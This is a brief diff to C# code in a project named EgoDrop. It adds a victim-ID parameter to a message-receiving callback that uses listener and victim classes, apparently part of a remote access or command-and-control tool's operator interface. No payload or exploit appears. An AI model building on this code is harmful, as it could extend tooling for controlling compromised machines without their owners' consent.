@@ -64,7 +64,7 @@ namespace EgoDrop
 
         private stImageInfo fnGetStructFromTag(ListViewItem item) => (stImageInfo)item.Tag;
 
-        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
+        void fnRecv(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
         {
             if (!clsTools.fnbSameVictim(victim, m_victim))
                 return;
